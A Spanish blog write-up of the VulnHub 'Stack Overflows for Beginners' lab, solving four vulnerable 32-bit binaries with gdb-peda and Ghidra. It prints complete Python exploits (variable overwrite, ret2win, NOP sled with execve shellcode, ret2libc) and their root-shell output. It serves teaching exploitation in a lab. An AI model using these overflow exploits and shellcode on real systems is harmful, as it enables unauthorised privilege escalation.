---
layout: single
title: Stack Overflows for Begginers - VulnHub
excerpt: "Tenemos que explotar 5 binarios que son todos los que te ofrece la maquina van por niveles en total son 5 los binarios que se tienen que explotar para esto vamos a utilizar gdb con peda instalado y ghidra para decompilar el codigo vamos a estar usando algunas tecnicas conocidas este es reto para las personas interesadas en aprender sobre BufferOverflow es por eso que se llama for Begginers"
date: 2023-02-09
classes: wide
header:
  teaser: /assets/images/vh-writeup-bf/template.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
  - Spanish
tags:  
  - BufferOverflow
  - Ret2libc
  - Stack based
---
![](/assets/images/vh-writeup-bf/template.png)

Vamos a empezar con el primer Binario

## Level 1

```bash
❯ file levelOne
levelOne: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7f79d9aa9e2ae354f484314499aaa4b48035c3a, not stripped
```

Este es el codigo del primer binario esta hecho en C lo que esta haciendo es que que la variable long key le esta asigando un valor que es `0x12345678` ademas esta definiendo el buffer de 32 caracteres y esta esperando un argumento y copea la entrada del usuario la funcion solo copea los caracteres de la entrada del usuario despues de eso entra a un condicional donde iguala que la key sea igual a `0x42424242` que esta en hexadecimal si se cumple la condicion va a ejecutar una bash ya que esta usando la funcion `execve`

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {
    
    uid_t uid = geteuid();

    setresuid(uid, uid, uid);

    long key = 0x12345678;
    char buf[32];

    strcpy(buf, argv[1]);

    printf("Buf is: %s\n", buf);
    printf("Key is: 0x%08x\n", key);

    if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }

    return 0;
}
```

Si queremos saber a que equivale `0x42` a `ascii` podemos usar varias formas una es buscar en internet directamente y nos dice que es igual a la letra `B` o tambien podemos hacerlo en Bash 


```
❯ echo -ne "\x42"
B#                                                                                                                        
```

Mas rapido y facil en python3 

```python
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(bytes.fromhex('42').decode())
B
>>> chr(int("0x42", base=16))
'B'
```

Bueno ahora que sabemos a que equivale `0x42` sabemos que el condicional esta haciendo un `key == BBBB` 4 B por que son 4 `0x42424242` para que nos de la bash tenemos que pasarle 32 bytes y darle las 4 B para que la condicion se pueda cumplir y nos de una bash

Entonces tenemos que crear un script para pasarselo como argumento

```python
#!/usr/bin/python2

first = b"A" * 32 # le pasamos 32 veces A para el buffer

key = b"B" * 4 # le pasamos las 4 B 

print(first + key)
```

Al cumplirse todo nos deberia de dar una bash como el usuario que esta corriendo el binario en esta caso yo no estoy en la maquina victima ya que esto lo estoy haciendo desde mi maquina de atacante y descarge los binarios es por eso que tambien no puedo mostrar el `level1.txt` pero si ustedes lo hacen en la maquina victima si lo podran ver

```
❯ ./levelOne $(python2 pwned1.py)
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
# whoami
root
```

## Level 2

```shell
❯ file levelTwo
levelTwo: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5b4ae31c0fd4332db20b40cb343f690ea5052aa9, not stripped
```

Para este nivel tendremos que ver mas a fondo el codigo entonces usaremos ghidra

```shell
❯ sudo ghidra > /dev/null 2>&1 & disown
[1] 68693
```

Estas son las funciones que esta usando el binario en el lenguaje C

![/assets/images/vh-writeup-bf/funciones.png](/assets/images/vh-writeup-bf/funciones.png)

Donde se declara el flujo inicial del programa es en el main asi que podemos verlo

Pues bueno le esta definiendo el uid al propietario del binario osea level2 ya que este es el segundo binario el `uid` es el identificador de usuario en linux y antes del return podemos ver que esta llamando a una funcion llamada `hello`

```c
undefined4 main(undefined4 param_1,int param_2)

{
  __uid_t __ruid;

  __ruid = geteuid();
  setresuid(__ruid,__ruid,__ruid);
  hello(*(undefined4 *)(param_2 + 4));
  return 0;
}
```

Ahora tenemos que ver la funcion `hello`

Bueno en esta funcion esta definiendo el buffer de tamaño de 28 bytes y despues usa la funcion que vimos en el primer binario que es `strcpy` que copea el argumento que le pases.

```c
void hello(char *param_1)

{
  char local_24 [28];

  strcpy(local_24,param_1);
  printf("Hello %s\n",local_24);
  return;
}
```

 Si seguimos inspeccionando las funciones podemos ver esta funcion `spawn` como podemos ver esta funcion se encarga de darnos una bash y le tenemos que pasar 3 argumentos

```c
void spawn(void)

{
  setuid(0);
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

Ahora vamos a utilizar gdb como debugger por que es un binario de linux yo lo uso con peda que facilita mas el trabajo en estos casos

Lo primero que vamos a hacer es pasarle el binario

```shell
❯ gdb -q levelTwo
Reading symbols from levelTwo...
(No debugging symbols found in levelTwo)
gdb-peda$ 
```

Como vimos en el script que esta definiendo 28 bytes en el buffer vamos a enviar 100 bytes de  caracteres para ver si se corrompe el binario


```shell
gdb-peda$ pattern_arg 100
Set 1 arguments to program
gdb-peda$
```

Una vez hecho esto ahora corremos el binario 

```shell
gdb-peda$ run
Starting program: /home/miguelrega7/VulnHub/StackOverflowForBeginners/content/levels/levelTwo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x6b ('k')
EBX: 0x413b4141 ('AA;A')
ECX: 0x0 
EDX: 0x1 
ESI: 0xffffd2d0 --> 0x2 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x41412941 ('A)AA')
ESP: 0xffffd280 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x61414145 ('EAAa')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61414145
[------------------------------------stack-------------------------------------]
0000| 0xffffd280 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd284 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd288 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd28c ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd290 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd294 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd298 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd29c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 in ?? ()
gdb-peda$ 
```

Bueno ahora tenemos que buscar el offset es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el `EIP` que es la direccion de memoria de la proxima instruccion a ejecutar el objetivo es manipular el valor del registro EIP para que apunte a una dirección de memoria controlada por el atacante

Y nos da como resultado 36

```shell
gdb-peda$ pattern_offset 0x61414145
1631666501 found at offset: 36
gdb-peda$
```

Ahora como vimos en el codigo hay una funcion spawn y necesitamos saber su direccion asi que vamos a eso 

```shell
gdb-peda$ info function ^spawn$
All functions matching regular expression "^spawn$":

Non-debugging symbols:
0x565561e9  spawn
gdb-peda$ 
```

Ahora ya tenemos la direccion

Como es 32 bytes y estamos en little endian tenemos que darle la vuleta ala direccion

```shell
0x565561e9      |    \x56\x55\x61\xe9    | \xe9\x61\x55\x56
```

Bueno ahora que tenemos ya todo hecho podemos proceder a crear el exploit para explotar en binario 

```python
#!/usr/bin/python2

offset = 36 # pattern_offset 0x61414145

null = b"A" * offset # vamos a pasarle eso para asta llegar al EIP

spawn = b"\xe9\x61\x55\x56" # Le pasamos la direccion para que el EIP apunte a ala funcion spawn 

print(null + spawn)
```

Ahora vamos a ejecutarlo

Y Logramos ejecutar comandos

```
❯ ./levelTwo $(python2 pwned2.py)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaUV
# whoami
root
# 
```

## Level 3

```shell
❯ file levelThree
levelThree: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a53242578c17f973d1f37148b2cb2251c2103f6, not stripped
```

En este binario no te prorpocionan el codigo desde antes pero vamos a usar ghidra para descompilarlo y ver mas informacion 
Estas son las funciones que esta usando 

![/assets/images/vh-writeup-bf/funciones3.png](/assets/images/vh-writeup-bf/funciones3.png)

Vamos a ver la funcion main

Vemos que esta haciendo casi lo mismo de antes pero ahora esta llamando ala funcion `overflow` ahora vamos a ver que hay en la funcion `overflow`

```c
undefined4 main(undefined4 param_1,int param_2)

{
  __uid_t __ruid;
  
  __ruid = geteuid();
  setresuid(__ruid,__ruid,__ruid);
  overflow(*(undefined4 *)(param_2 + 4));
  return 0;
}
```

Esto es lo que hace la funcion `overflow`

Ahora define un buffer de 260 bytes y copea el argumento con la funcion strcpy que habias visto de antes en los binarios anteriores si `param_1` contiene más de 260 caracteres, los datos adicionales se escribirán en la memoria adyacente a `local_10c`, lo que puede provocar un desbordamiento de búfer.


```c
void overflow(char *param_1)

{
  char local_10c [260];
  
  strcpy(local_10c,param_1);
  printf("Buf: %s\n",local_10c);
  return;
}
```

Vamos a usar `gdb` otra vez para corromper el binario  

```shell
❯ gdb -q levelThree
Reading symbols from levelThree...
(No debugging symbols found in levelThree)
gdb-peda$ pattern_arg 300
Set 1 arguments to program
gdb-peda$ run
Starting program: /home/miguelrega7/VulnHub/StackOverflowForBeginners/content/levels/levelThree 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
Buf: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x132 
EBX: 0x25413225 ('%2A%')
ECX: 0x0 
EDX: 0x1 
ESI: 0xffffd200 --> 0x2 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x64254148 ('HA%d')
ESP: 0xffffd1b0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41332541 ('A%3A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41332541
[------------------------------------stack-------------------------------------]
0000| 0xffffd1b0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xffffd1b4 ("eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xffffd1b8 ("A%JA%fA%5A%KA%gA%6A%")
0012| 0xffffd1bc ("%fA%5A%KA%gA%6A%")
0016| 0xffffd1c0 ("5A%KA%gA%6A%")
0020| 0xffffd1c4 ("A%gA%6A%")
0024| 0xffffd1c8 ("%6A%")
0028| 0xffffd1cc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 in ?? ()
gdb-peda$ 
```

Ahora como el otra vez tenemos que buscar el `offset` para esto le vamos a pasar el `EIP`

```shell
gdb-peda$ pattern_offset 0x41332541
1093870913 found at offset: 268
gdb-peda$ 
```

Necesitamos 268 bytes antes de sobreescribir el `EIP`

Ahora ya podemos proceder a hacer el script ya que no hay una funcion que nos otorge una bash asi que tenemos que definir un `shellcode` para otras explataciones podemos usar `msfvenom` pero en este nivel no es necesario usaremos esto:

- [shellcode](https://www.exploit-db.com/shellcodes/13628)

```python
#!/usr/bin/python2

offset = 268

shellcode  = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"
```

Ahora vamos a usar `NOP` que no realizar ninguna accion solo para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del shellcode por que no podemos pasarmos de 268 bytes para no sobreescribir el `EIP`


```python
#!/usr/bin/python2

offset = 268
#En el shellcode son las intrucciones maliciosas 
shellcode  = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

junk  = b"\x90" * (offset - len(shellcode)) # \x90", representa la instrucción "NOP" en lenguaje de máquina
eip = b"B" * 4 # eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.
print(junk + shellcode + eip) 
```

Ahora para probar vamos con gdb pasando el script como argumento

```shell
❯ gdb -q levelThree
Reading symbols from levelThree...
(No debugging symbols found in levelThree)
gdb-peda$ run $(python2 pwned3.py)
Starting program: /home/miguelrega7/VulnHub/StackOverflowForBeginners/content/levels/levelThree $(python2 pwned3.py)
Buf: j
      XRh//shh/bin1̀BBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x116 
EBX: 0xe3896e69 
ECX: 0x0 
EDX: 0x1 
ESI: 0xffffd220 --> 0x2 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x80cdc931 
ESP: 0xffffd1d0 --> 0xffffd400 --> 0xf 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd1d0 --> 0xffffd400 --> 0xf 
0004| 0xffffd1d4 --> 0x0 
0008| 0xffffd1d8 --> 0x0 
0012| 0xffffd1dc ("7bUV\374s\372", <incomplete sequence \367>)
0016| 0xffffd1e0 --> 0xf7fa73fc --> 0xf7fa82c0 --> 0x0 
0020| 0xffffd1e4 --> 0x56559000 --> 0x3efc 
0024| 0xffffd1e8 --> 0xffffd2d0 --> 0xffffd596 ("LC_TIME=es_MX.UTF-8")
0028| 0xffffd1ec --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

Vemos que el `EIP` contiene `BBBB`

Vamos a buscar en la Pila alguna una dirreccion que contenga los nops que estan antes del shellcode


```shell
gdb-peda$ x/300wx $esp
0xffffd1d0:	0xffffd400	0x00000000	0x00000000	0x56556237
0xffffd1e0:	0xf7fa73fc	0x56559000	0xffffd2d0	0x00000000
0xffffd1f0:	0x00000002	0xffffd2c4	0xffffd2d0	0xffffd220
0xffffd200:	0x00000000	0xf7fa7000	0x00000000	0xf7ddce46
0xffffd210:	0xf7fa7000	0xf7fa7000	0x00000000	0xf7ddce46
0xffffd220:	0x00000002	0xffffd2c4	0xffffd2d0	0xffffd254
0xffffd230:	0xffffd264	0xf7ffdb40	0xf7fca410	0xf7fa7000
0xffffd240:	0x00000001	0x00000000	0xffffd2a8	0x00000000
0xffffd250:	0xf7ffd000	0x00000000	0xf7fa7000	0xf7fa7000
0xffffd260:	0x00000000	0xf5c0af57	0xb1ff1147	0x00000000
0xffffd270:	0x00000000	0x00000000	0x00000002	0x56556090
0xffffd280:	0x00000000	0xf7fe88f0	0xf7fe3230	0x56559000
0xffffd290:	0x00000002	0x56556090	0x00000000	0x565560c1
0xffffd2a0:	0x56556212	0x00000002	0xffffd2c4	0x56556280
0xffffd2b0:	0x565562e0	0xf7fe3230	0xffffd2bc	0x0000001c
0xffffd2c0:	0x00000002	0xffffd437	0xffffd485	0x00000000
0xffffd2d0:	0xffffd596	0xffffd5aa	0xffffd5c2	0xffffd6ce
0xffffd2e0:	0xffffd6e5	0xffffd6f0	0xffffd709	0xffffd71a
0xffffd2f0:	0xffffd743	0xffffd757	0xffffd772	0xffffd790
0xffffd300:	0xffffd7a7	0xffffd7bc	0xffffd7cd	0xffffd7e1
0xffffd310:	0xffffddd0	0xffffdde4	0xffffddf1	0xffffddfb
0xffffd320:	0xffffde06	0xffffde19	0xffffde32	0xffffde48
0xffffd330:	0xffffde56	0xffffde64	0xffffde6c	0xffffdeb3
0xffffd340:	0xffffdefd	0xffffdf1b	0xffffdf27	0xffffdf3b
0xffffd350:	0xffffdf45	0xffffdf95	0xffffdf9e	0x00000000
0xffffd360:	0x00000020	0xf7fd0550	0x00000021	0xf7fd0000
0xffffd370:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
0xffffd380:	0x00000006	0x00001000	0x00000011	0x00000064
0xffffd390:	0x00000003	0x56555034	0x00000004	0x00000020
0xffffd3a0:	0x00000005	0x0000000b	0x00000007	0xf7fd2000
0xffffd3b0:	0x00000008	0x00000000	0x00000009	0x56556090
0xffffd3c0:	0x0000000b	0x00000000	0x0000000c	0x00000000
0xffffd3d0:	0x0000000d	0x00000000	0x0000000e	0x00000000
0xffffd3e0:	0x00000017	0x00000000	0x00000019	0xffffd41b
0xffffd3f0:	0x0000001a	0x00000002	0x0000001f	0xffffdfaa
0xffffd400:	0x0000000f	0xffffd42b	0x00000000	0x00000000
0xffffd410:	0x00000000	0x00000000	0x15000000	0x77c52413
0xffffd420:	0xa5540532	0xc2871889	0x69c23290	0x00363836
0xffffd430:	0x00000000	0x2f000000	0x656d6f68	0x67696d2f
0xffffd440:	0x726c6575	0x37616765	0x6c75562f	0x6275486e
0xffffd450:	0x6174532f	0x764f6b63	0x6c667265	0x6f46776f
0xffffd460:	0x67654272	0x656e6e69	0x632f7372	0x65746e6f
0xffffd470:	0x6c2f746e	0x6c657665	0x656c2f73	0x546c6576
0xffffd480:	0x65657268	0x90909000	0x90909090	0x90909090
0xffffd490:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x99580b6a
0xffffd580:	0x2f2f6852	0x2f686873	0x896e6962	0xcdc931e3
0xffffd590:	0x42424280	0x434c0042	0x4d49545f	0x73653d45
0xffffd5a0:	0x2e584d5f	0x2d465455	0x434c0038	0x4e4f4d5f
0xffffd5b0:	0x52415445	0x73653d59	0x2e584d5f	0x2d465455
0xffffd5c0:	0x41500038	0x2f3d4854	0x746f6f72	0x6f6c2e2f
0xffffd5d0:	0x2f6c6163	0x3a6e6962	0x616e732f	0x69622f70
0xffffd5e0:	0x752f3a6e	0x732f7273	0x62646e61	0x3a2f786f
0xffffd5f0:	0x7273752f	0x636f6c2f	0x622f6c61	0x2f3a6e69
0xffffd600:	0x2f727375	0x3a6e6962	0x6e69622f	0x73752f3a
0xffffd610:	0x6f6c2f72	0x2f6c6163	0x656d6167	0x752f3a73
0xffffd620:	0x672f7273	0x73656d61	0x73752f3a	0x68732f72
0xffffd630:	0x2f657261	0x656d6167	0x752f3a73	0x6c2f7273
0xffffd640:	0x6c61636f	0x6962732f	0x752f3a6e	0x732f7273
0xffffd650:	0x3a6e6962	0x6962732f	0x6f2f3a6e	0x6e2f7470
0xffffd660:	0x2d6d6976	0x756e696c	0x2f343678	0x3a6e6962
0xffffd670:	0x74706f2f	0x6c33692f	0x2d6b636f	0x636e6166
gdb-peda$ 
```

Bueno vamos a tomar una direccion que contengo solo nops que es la esta mas repetida en este caso seria esta que yo elegi
`0xffffd520:0x90909090`

Junk contiene una secuencia de caracteres `\x90` que, en hexadecimal, equivale a `0x90`, que es una sola instrucción NOP.

De igual forma estamos en `little endian` asi que vamos a darle la vuelta

```shell
0xffffd520    | \xff\xff\xd5\x20     | \x20\xd5\xff\xff
```

Ahora lo que vamos a hacer es cambiar los `4 B` que habias puesto por la direccion en los nops esto para que los nops se desplacen en la pila asta llegar al shellcode y se ejecute

IMPORTANTE: en caso de que no te de una shell prueba cambiando la direccion para que te de una shell

```
❯ ./levelThree $(python2 pwned3.py)
Buf: j
      XRh//shh/bin1̀P
# whoami
root
# 
```

## Level 4


En el siguiente binario vamos a usar la tecnica `rebase2libc`, consiste en  explotar un buffer overflow para hacer que el programa salte a una función en la biblioteca estándar C (libc), en lugar de saltar a su propio código malicioso. Esto puede ser más fácil y menos detectable que inyectar y ejecutar código malicioso directamente.

```shell
❯ file levelFour
levelFour: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=845e990443a38b38a87fb868319fd05d7f87a144, not stripped
```

Usaremos ghidra para ver las funciones del binario

Ahora vamos a ver la funcion main y vemos que hace lo mismo del binario anterior

```c
undefined4 main(undefined4 param_1,int param_2)

{
  __uid_t __ruid;
  
  __ruid = geteuid();
  setresuid(__ruid,__ruid,__ruid);
  overflow(*(undefined4 *)(param_2 + 4));
  return 0;
}
```

Vamos a ver la funcion overflow

Ahora le esta dando 20 bytes al buffer

```c
void overflow(char *param_1)

{
  char local_1c [20];
  
  strcpy(local_1c,param_1);
  printf("Buf: %s\n",local_1c);
  return;
}
```

No podemos correr el shellcode de antes por que mide mas del buffer asignado vamos a comenzar a hacer el ret2libc 

Comenzamos ahora pasandole 50 bytes

```shell
❯ gdb -q levelFour
Reading symbols from levelFour...
(No debugging symbols found in levelFour)
gdb-peda$ pattern_arg 50
Set 1 arguments to program
gdb-peda$ run
Starting program: /home/miguelrega7/VulnHub/StackOverflowForBeginners/content/levels/levelFour 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
Buf: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x38 ('8')
EBX: 0x41412d41 ('A-AA')
ECX: 0x0 
EDX: 0x1 
ESI: 0xffffd300 --> 0x2 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x44414128 ('(AAD')
ESP: 0xffffd2b0 ("A)AAEAAaAA0AAFAAbA")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffd2b0 ("A)AAEAAaAA0AAFAAbA")
0004| 0xffffd2b4 ("EAAaAA0AAFAAbA")
0008| 0xffffd2b8 ("AA0AAFAAbA")
0012| 0xffffd2bc ("AFAAbA")
0016| 0xffffd2c0 --> 0xf7004162 
0020| 0xffffd2c4 --> 0x56559000 --> 0x3efc 
0024| 0xffffd2c8 --> 0xffffd3b0 --> 0xffffd598 ("LC_TIME=es_MX.UTF-8")
0028| 0xffffd2cc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()
gdb-peda$ 
```

Vamos a comenzar haciendo el script pero solo indicaremos el offset y variable junk que es basura para llegar a `EIP`

```shell
gdb-peda$ pattern_offset 0x413b4141
1094402369 found at offset: 28
gdb-peda$ 
```

```python
#!/usr/bin/python2

offset = 28

junk = b"A" * offset
```

Bueno como va a hacer un reb2libc tenemos que saber las direcciones de system y exit de la funcion `libc`

Direccion de system

```shell
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e03000 <system>
gdb-peda$ 
```

Direccion de exit

```shell
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7df5950 <exit>
gdb-peda$ 
```

Ahora tenemos que saber la direccion de `/bin/sh` de libc dentro de `gdb`

```shell
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4a338 ("/bin/sh")
gdb-peda$
```

Estamos en little endian entoncces tenemos que darle la vuelta a todas las direcciones

```shell
0xf7e03000  |  \xf7\xe0\x30\x00   |   \x00\x30\xe0\xf7

0xf7df5950  |  \xf7\xdf\x59\x50   |   \x50\x59\xdf\xf7

0xf7f4a338  |  \xf7\xf4\xa3\x38   |   \x38\xa3\xf4\xf7
```

Ahora vamos a agregar las direcciones a nuestro script


```python
#!/usr/bin/python2

offset = 28

junk = b"A" * offset

addr_system = b"\x00\x30\xe0\xf7"
addr_exit = b"\x50\x59\xdf\xf7"
addr_bin_sh = b"\x38\xa3\xf4\xf7" # aqui es donde llamamos a /bin/bash para que nos de una shell

print(junk + addr_system + addr_exit + addr_bin_sh)
```

```
❯ ./levelFour $(python2 pwned4.py)
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAA
# whoami
root
# 
```

## Level 5

Bueno para este nivel se usa `libc` para hacer un `jmp` al `esp` y ahi meter el shellcode de `setreuid` y `/bin/sh`

Pero para ver esta explicacion de este nivel y mucho mas contenido de maquinas vulnerables a BufferOverflow ir ala pagina de GatoGamer ya que el tiene mejor dominio en esto del BufferOverflow 

- [Pagina de GatoGamer](https://gatogamer1155.github.io/vulnhub/stackoverflow/)


































































